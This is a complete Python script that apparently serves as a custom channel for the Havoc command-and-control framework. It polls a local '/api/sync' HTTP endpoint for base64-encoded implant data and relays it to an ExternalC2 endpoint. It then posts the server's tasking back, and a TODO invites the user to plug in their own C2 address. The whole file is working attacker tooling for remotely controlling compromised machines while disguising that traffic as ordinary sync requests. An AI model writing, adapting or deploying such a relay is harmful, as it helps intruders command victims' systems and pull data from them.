import requests
import json
import socket
import time
import os
import sys
import base64
import random
import string
import platform
import math
from havoc.externalc2 import ExternalC2

URL = "http://127.0.0.1:4696"

def uploadData(data):
    requests.post(
        f"{URL}/api/sync",
        json={"data": data}
    )
    return

def downloadData():
    r = requests.get(f"{URL}/api/sync")
    result = r.json().get("data")
    return result if result else ""

def getAgentData():
    print("[+] Downloading data")
    res = downloadData()
    print("[+] Got data: "+str(res))
    return res

def sendData(data):
    print("[+] Sending data: "+str(base64.b64encode(data.encode('utf-8')).decode('utf-8')))
    uploadData(base64.b64encode(data.encode('utf-8')))
    print("[+] Sent data ")
    return

def transmitToC2(data):
    try:
        print("[+] Transmitting data to C2")
        response = externalc2.transmit(base64.b64decode(data))
        print("[+] Received response from C2: " + response + "\n")
        return response
    except:
        return ""

externalc2 = ExternalC2("https://127.0.0.1:40056/ExtEndpoint") # TODO: Replace with your own ExternalC2 endpoint
print("[+] Connected to ExternalC2 Endpoint")

prevdata = ""

while True:
    # You can update this loop if you need to, but it's not necessary
    agentdata = getAgentData()
    if agentdata != "" and (agentdata != prevdata or "gettask\", \"data\": \"\"" in str(base64.b64decode(agentdata))):
        print("[+] Retrieved agent data: "+str(agentdata))
        res = transmitToC2(agentdata)
        print("[+] Received response from C2: "+str(res))
        sendData(res)
    time.sleep(5)
    prevdata = agentdata